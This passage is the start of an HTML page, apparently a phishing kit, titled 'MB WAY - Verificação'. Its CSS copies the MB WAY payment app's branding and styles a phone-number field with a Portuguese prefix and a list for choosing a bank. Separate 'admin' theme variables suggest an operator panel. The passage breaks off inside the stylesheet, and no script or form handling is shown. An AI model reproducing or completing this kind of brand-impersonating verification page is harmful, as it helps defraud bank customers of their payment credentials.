<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MB WAY - Verificação</title>
    <style>
        :root {
            --mb-red: #E60000;
            --mb-black: #1A1A1A;
            --mb-bg-gray: #F5F5F7;
            --mb-white: #FFFFFF;
            --mb-text-muted: #6E6E73;
            --mb-link-blue: #0071E3;
            --mb-border: #D2D2D7;
            --mb-btn-disabled: #E5E5EA;
            --mb-btn-active: #1A1A1A;
            --mb-success: #34C759;
            --admin-bg: #121212;
            --admin-card: #1E1E1E;
            --admin-text: #E0E0E0;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #333; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
            font-size: 16px;
        }

        /* CONTAINER PRINCIPAL */
        .app-container {
            width: 100%;
            max-width: 414px;
            height: 850px;
            background: var(--mb-white);
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 30px rgba(0,0,0,0.3);
            border-radius: 20px;
            display: flex;
            flex-direction: column;
        }

        /* TELAS GERAIS */
        .screen {
            display: none;
            flex-direction: column;
            height: 100%;
            padding: 24px;
            background: var(--mb-white);
            animation: fadeIn 0.3s ease-in-out;
        }
        .screen.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* HEADER */
        .header { display: flex; align-items: center; margin-bottom: 30px; }
        .back-btn { background: none; border: none; font-size: 24px; cursor: pointer; padding: 5px; color: var(--mb-black); }
        .header-title { flex: 1; text-align: center; font-weight: 600; font-size: 17px; }
        .header-spacer { width: 30px; }

        /* LOGO */
        .logo-container { display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
        .logo-mb { font-size: 32px; font-weight: 900; font-style: italic; color: var(--mb-black); position: relative; padding: 0 8px; }
        .logo-mb::before, .logo-mb::after { content: ''; position: absolute; width: 4px; height: 60%; background-color: var(--mb-red); border-radius: 2px; }
        .logo-mb::before { left: 0; top: 20%; }
        .logo-mb::after { right: 0; top: 20%; }
        .logo-way { font-size: 32px; font-weight: 900; font-style: italic; color: var(--mb-black); margin-left: 5px; }

        /* TEXTOS */
        .main-title { font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 10px; color: var(--mb-black); }
        .sub-title { font-size: 15px; color: var(--mb-text-muted); text-align: center; margin-bottom: 30px; line-height: 1.5; }

        /* FORMULÁRIOS */
        .input-group { margin-bottom: 20px; }
        .input-label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: var(--mb-black); }
        .input-field { width: 100%; padding: 14px; border: 1px solid var(--mb-border); border-radius: 10px; font-size: 16px; outline: none; background: var(--mb-white); transition: border-color 0.2s; }
        .input-field:focus { border-color: var(--mb-link-blue); box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.1); }
        
        /* TELEFONE */
        .phone-wrapper { display: flex; align-items: center; border: 1px solid var(--mb-border); border-radius: 10px; overflow: hidden; }
        .phone-prefix { padding: 14px; background: var(--mb-bg-gray); border-right: 1px solid var(--mb-border); font-weight: 600; display: flex; align-items: center; gap: 6px; }
        .flag-icon { width: 20px; height: 14px; background: linear-gradient(90deg, #006600 33%, #fff 33%, #fff 66%, #FF0000 66%); border: 1px solid #ccc; border-radius: 2px; }
        .phone-input { flex: 1; border: none; padding: 14px; font-size: 16px; outline: none; }

        /* BOTÕES */
        .btn { width: 100%; padding: 16px; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s; margin-top: 10px; }
        .btn-primary { background-color: var(--mb-btn-active); color: white; }
        .btn-primary:disabled { background-color: var(--mb-btn-disabled); color: #999; cursor: not-allowed; }
        .btn-outline { background: transparent; border: 1px solid var(--mb-border); color: var(--mb-black); margin-top: 15px; }

        /* LISTA DE BANCOS */
        .bank-list { flex: 1; overflow-y: auto; margin-top: 10px; }
        .bank-item { display: flex; align-items: center; padding: 15px; border-bottom: 1px solid var(--mb-border); cursor: pointer; }
        .bank-item:active { background-color: var(--mb-bg-gray); }
        .bank-logo { width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; margin-right: 15px; font-size: 14px; }
        .bank-name { flex: 1; font-size: 16px; font-weight: 500; }
        .bank-chevron { color: #999; font-size: 20px; }
